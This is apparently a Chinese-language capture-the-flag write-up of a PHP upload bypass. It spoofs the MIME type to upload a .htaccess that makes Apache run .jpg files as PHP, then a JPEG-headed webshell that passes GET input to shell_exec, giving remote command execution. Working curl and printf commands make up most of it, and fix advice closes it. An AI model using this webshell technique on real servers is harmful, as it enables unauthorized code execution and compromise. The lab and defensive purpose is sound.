# 40 · Combo Upload Bypass（`.htaccess` + 图片马）

> 目标：`http://目标地址` ｜ Flag 在容器 `/flag`，必须 RCE

## 一、漏洞三连击

| # | 漏洞 | 说明 |
|---|------|------|
| ① | **黑名单不全** | 仅黑 `php/php3/php4/php5/php7/phtml/pht/phar`，没黑 `.htaccess` 和 `.jpg` |
| ② | **MIME 校验形同虚设** | 服务端只看请求里的 `Content-Type`，攻击者可任意伪造 |
| ③ | **Apache `AllowOverride All` + `mod_php`** | `/uploads/` 下放 `.htaccess` 即可改写解析规则 |

闭环：上传 `.htaccess`（让 `.jpg` 当 PHP 解析）→ 上传图片马 `shell.jpg` → 访问触发 RCE。

## 二、关键探测

页面提示 `系统支持上传 .htaccess 文件…`，并暗示存储在 `/uploads/` 且**原文件名保留**——这是最致命的信号。

```bash
B=http://目标地址
printf '\xff\xd8normal' > /tmp/n.jpg
curl -s "$B/" -F "file=@/tmp/n.jpg;type=image/jpeg" | grep href
# -> /uploads/n.jpg  （原名保留 ✔）
```

## 三、手工三步走

### Step 1 · 上传 `.htaccess`

`curl -F` 默认把本地文件 basename 作 filename，所以用 `filename=.htaccess` **显式覆盖**；同时把 `type` 伪造成 `image/jpeg` 骗 MIME 白名单。

```bash
echo 'AddType application/x-httpd-php .jpg' > /tmp/ht
curl -s "$B/" -F "file=@/tmp/ht;filename=.htaccess;type=image/jpeg"
# -> 上传成功：/uploads/.htaccess
```

> 为什么过黑名单？服务端 `pathinfo('.htaccess', PATHINFO_EXTENSION)` 结果是空字符串 `""`，自然不在 `[php, php3, ...]` 里。

### Step 2 · 构造图片马 `shell.jpg`

JFIF 头让 `exif_imagetype()` 判为 JPEG（即使本题没校验，养成习惯），后面拼 PHP 代码：

```bash
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > /tmp/shell.jpg
printf '%s' '<?php echo "FLAG:".shell_exec($_GET["c"]); ?>' >> /tmp/shell.jpg
curl -s "$B/" -F "file=@/tmp/shell.jpg;type=image/jpeg"
# -> 上传成功：/uploads/shell.jpg
```

> 注意：用 **单引号** `'...'` 包裹 PHP 代码，防止 bash 把 `$_GET` 当变量展开。

### Step 3 · 触发 RCE

```bash
curl -s "$B/uploads/shell.jpg?c=cat+/flag" | strings
# ...JFIF...
# FLAG:TOGOGO-flag{}
```

Apache 看到 `/uploads/.htaccess` 的 `AddType application/x-httpd-php .jpg` 后，就把当前目录下所有 `.jpg` 交给 `mod_php` 解析，于是 `<?php ... ?>` 被执行。

## 四、为什么能过三道门？

```text
上传 .htaccess:
  ext = ""             → 黑名单 in_array("", [...])  = false ✔
  type = image/jpeg    → 白名单 in_array(...)        = true  ✔
  size << 1MB                                                ✔

上传 shell.jpg:
  ext = "jpg"          → 不在黑名单                            ✔
  type = image/jpeg    → 在白名单                              ✔
  内容含 <?php，但服务端没扫文件内容                            ✔
```

## 五、修复建议（背一下）

1. **上传目录关闭 PHP 执行**：`php_admin_flag engine off` 或 nginx `location ~ \.php$ { return 403; }`。
2. **禁止 `AllowOverride`**：`AllowOverride None`，彻底封死 `.htaccess`。
3. **白名单 + 服务端探测**：`finfo_file()` / `exif_imagetype()` 取真实类型，不信任 `$_FILES['type']`。
4. **重命名 + 随机化扩展名**：`uniqid().'.jpg'`，杜绝 `.htaccess`、`.user.ini`、双扩展。
5. **存储到非 WebRoot**：通过下载脚本输出，禁止直接 URL 访问。
